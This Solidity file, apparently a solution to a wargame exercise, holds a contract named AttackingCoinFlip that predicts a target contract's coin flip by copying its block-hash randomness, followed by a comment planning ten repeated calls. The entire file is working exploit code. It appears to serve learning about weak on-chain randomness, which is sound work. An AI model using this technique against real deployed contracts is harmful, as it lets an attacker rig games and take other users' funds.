// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./CoinFlip.sol";

interface ICoinFlip {
    function flip(bool) external returns (bool);
}

contract AttackingCoinFlip {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function hackContract() external {

        uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / factor;
        bool side = coinFlip == 1 ? true : false;

        ICoinFlip(contractAddress).flip(side);
    }
}

// Plan: duplicate the pseudo-randomness logic in CoinFlip::flip to return the same value
// Run it 10 separate times in the helper, since tx's can't be from the same block number

